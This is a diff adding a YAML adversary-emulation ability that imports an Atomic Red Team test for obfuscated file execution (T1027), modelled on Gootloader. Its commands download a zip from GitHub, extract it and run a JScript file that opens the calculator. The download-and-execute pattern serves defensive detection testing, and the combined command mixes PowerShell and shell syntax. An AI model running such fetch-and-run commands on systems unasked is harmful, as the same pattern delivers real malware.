@@ -1,0 +1,60 @@
+- id: fad04df1-5229-4185-b016-fb6010cd87ac
+  name: Execution from Compressed JScript File
+  description: Mimic execution of compressed JavaScript file. When successfully executed,
+    calculator.exe will open. This test is meant to help emulate Gootloader as per
+    https://redcanary.com/blog/gootloader/
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027
+    name: Obfuscated Files or Information
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"; Expand-Archive
+          -path "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -DestinationPath
+          "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\" -Force; fi;
+          "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"'
+        cleanup: taskkill /f /im calculator.exe >nul 2>nul
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1027
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      url_path:
+        description: url to download JScript file
+        type: url
+        default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip
+    dependencies:
+    - description: 'T1027.js must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js
+
+        '
+      prereq_command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js")
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+        Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"
+
+        Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"
+        -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\"
+        -Force
+
+        '
+    technique_created: '2017-05-31T21:30:32.662Z'
+    atomic_guid: fad04df1-5229-4185-b016-fb6010cd87ac
+    import_timestamp: '2025-06-24T11:15:01.180420Z'
